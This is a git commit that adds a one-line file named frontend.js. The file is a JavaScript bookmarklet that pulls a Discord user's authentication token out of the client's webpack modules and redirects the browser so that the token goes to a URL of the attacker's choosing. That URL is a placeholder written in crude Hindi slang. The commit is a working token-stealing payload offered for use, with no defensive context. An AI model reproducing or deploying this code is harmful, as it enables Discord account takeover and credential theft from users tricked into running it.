ea3d96cb57e9618528320b59667eb5252c7a69da
RisinPlayZ <60840691+RisinPlayZ@users.noreply.github.com>
2022-04-02 22:22:21 +0530

    Create frontend.js

---
+++ frontend.js
@@ -0,0 +1,1 @@
+javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();window.location.href = `IDHAR APNA URL DAAL DE BHADWE/?user=${token}`;})()
